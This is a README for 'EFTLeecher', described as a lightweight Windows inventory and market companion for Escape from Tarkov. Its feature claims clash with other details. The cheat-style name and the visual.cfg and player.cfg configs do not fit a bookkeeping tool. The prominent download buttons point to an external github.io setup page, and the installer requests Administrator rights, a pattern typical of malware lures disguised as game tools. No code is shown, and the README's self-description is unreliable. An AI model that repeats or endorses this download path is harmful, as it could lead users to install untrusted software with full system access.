# EFTLeecher

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-ea580c?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-65a30d?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-0891b2?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/ARCHIVE-READY-b45309?style=for-the-badge&logo=docker&logoColor=white&labelColor=161b22" alt="ARCHIVE"></a> <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-0d9488?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a>
</div>

**A lightweight Windows‑only companion for *Escape from Tarkov***

> **Author:** WindRainTier | **Supported OS:** Windows 10 / Windows 11

---

## 📖 What is EFTLeecher?

EFTLeecher is a small, focused desktop utility that helps you stay on top of your Tarkov gear and market trends without leaving the game.
- **Instant inventory overview** – see quantities, condition and pricing at a glance.
- **Live market feed** – pull the latest flea‑market data directly into the app.
- **One‑click export** – generate CSV/JSON snapshots for personal tracking or community sharing.

All of this runs locally on Windows, keeping your data private and your workflow fast.

---

## ✨ Features

| ✅ | Feature | Description |
|---|---|---|
| 🎯 | **Windows‑only native UI** | Built with WinForms/WPF for a smooth, native feel. |
| 📦 | **Inventory sync** | Reads your local Tarkov save files and presents a clean table view. |
| 📈 | **Market data** | Pulls live flea‑market listings (price, volume, trader status). |
| 📂 | **Export options** | Save snapshots as CSV or JSON for spreadsheets or scripts. |
| 🔧 | **Custom filters** | Filter by item type, rarity, price range, or condition. |
| 🛡️ | **No telemetry** | All data stays on your machine – no external reporting. |
| 🌐 | **Open‑source** | Fork, improve, or adapt the code under the MIT license. |

---

## 🚀 Getting Started

1. **Download** the latest release from the Release page.
2. Run the installer (requires Administrator rights the first time).
3. Launch **EFTLeecher** from the Start menu.
4. Point the app to your Tarkov `user` folder (default location is auto‑detected).
5. Enjoy real‑time inventory and market insights!

---

## 📦 Installation

<div style="display:flex; gap:10px; flex-wrap:wrap;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4CAF50;color:white;padding:10px 20px;border-radius:5px;text-decoration:none;font-weight:bold;">Download & Install</a>
  <a href="https://github.com/rewfdf/EFTLeecher/releases/latest" style="background:#2196F3;color:white;padding:10px 20px;border-radius:5px;text-decoration:none;font-weight:bold;">View Releases</a>
  <a href="https://github.com/rewfdf/EFTLeecher/wiki" style="background:#FF9800;color:white;padding:10px 20px;border-radius:5px;text-decoration:none;font-weight:bold;">Documentation</a>
</div>

---

## 🛠️ Build from Source

If you prefer to compile yourself:

```bash
git clone https://github.com/rewfdf/EFTLeecher.git
cd EFTLeecher
dotnet restore
dotnet build -c Release
```

> **Prerequisites:** .NET 6 SDK or later, Windows 10/11.

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑feature`).
3. Open a Pull Request with a clear description of your changes.

See the [CONTRIBUTING.md](https://github.com/rewfdf/EFTLeecher/blob/main/CONTRIBUTING.md) for guidelines.

---

## 📜 License

EFTLeecher is released under the **MIT License** – see the [LICENSE](https://github.com/rewfdf/EFTLeecher/blob/main/LICENSE) file for details.

---

## 🙏 Acknowledgements

- Thanks to the *Escape from Tarkov* community for data insights.
- Built with C# / .NET, WinForms, and the fantastic open‑source libraries that power the market API integration.

---

*Stay sharp, stay organized – let EFTLeecher handle the bookkeeping while you focus on the raid.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```